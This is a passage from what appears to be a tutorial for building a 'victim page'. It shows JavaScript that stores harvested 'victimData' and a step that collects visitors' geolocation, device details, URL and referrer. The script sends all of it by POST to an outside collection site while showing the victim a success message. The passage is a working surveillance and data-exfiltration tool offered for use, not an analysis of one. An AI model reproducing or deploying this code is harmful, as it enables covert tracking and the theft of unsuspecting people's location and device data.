javascript
// This script handles data collection and storage
class DataCollector {
    constructor() {
        this.storageKey = 'victimData';
    }

    // Save data to localStorage
    saveData(data) {
        try {
            const existingData = JSON.parse(localStorage.getItem(this.storageKey) || '[]');
            existingData.push(data);
            localStorage.setItem(this.storageKey, JSON.stringify(existingData));
            return true;
        } catch (error) {
            console.error('Error saving data:', error);
            return false;
        }
    }

    // Get all collected data
    getAllData() {
        return JSON.parse(localStorage.getItem(this.storageKey) || '[]');
    }

    // Clear all data
    clearAllData() {
        localStorage.removeItem(this.storageKey);
    }
}

// Initialize the collector
const collector = new DataCollector();
```

### Step 4: Update your victim page to use the collector
Update your `index.html` to include this script:

```html
<!-- Add this to your index.html before the closing </body> tag -->
<script>
    // Add this to your existing script
    // When sending data, also save it locally
    async function sendData() {
        try {
            const location = await getLocation();
            const deviceInfo = getDeviceInfo();

            const data = {
                timestamp: new Date().toISOString(),
                location: location,
                device: deviceInfo,
                url: window.location.href,
                referrer: document.referrer
            };

            // Send to your collect site
            const response = await fetch('https://CyberKoroc.github.io/collect/', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(data)
            });

            // Also save locally for offline access
            collector.saveData(data);

            if (response.ok) {
                showStatus('Success! Permissions granted and data sent.', 'success');
            } else {
                showStatus('Data sent but with issues (server error).', 'error');
            }
        } catch (error) {
            console.log('Send error:', error);
            showStatus('Error collecting data: ' + error.message, 'error');
        }
    }
</script>
